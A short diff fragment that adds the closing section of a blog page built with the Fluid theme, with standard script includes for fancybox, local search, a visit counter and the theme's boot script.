+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
